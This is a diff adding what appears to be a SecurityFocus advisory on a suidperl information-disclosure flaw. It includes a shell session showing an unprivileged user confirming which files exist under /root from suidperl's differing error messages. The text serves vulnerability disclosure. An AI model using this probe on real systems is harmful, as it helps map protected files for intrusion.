@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/6282/info
+
+An information disclosure vulnerability has been reported for SuidPerl. Reportedly, it is possible for an attacker to determine whether files exist in non-accessible directories.
+
+An attacker can exploit this vulnerability by invoking suidperl with an absolute filename to determine whether the file exists. When run in this manner, suidperl will return with a message that confirms the existence of a file.
+
+bash-2.04$ ls -ald /root
+drwxr-x--- 66 root root 8192 Nov 29 16:00 /root
+bash-2.04$ id
+uid=500(evil) gid=500(evil) groups=500(evil)
+bash-2.04$ ls /root/.bashrc
+ls: /root/.bashrc: Permission denied
+bash-2.04$ suidperl /root/.bashrc
+Script is not setuid/setgid in suidperl
+bash-2.04$ suidperl /root/nonexistantfile
+Can't open perl script "/root/nonexistantfile": No such file or directory
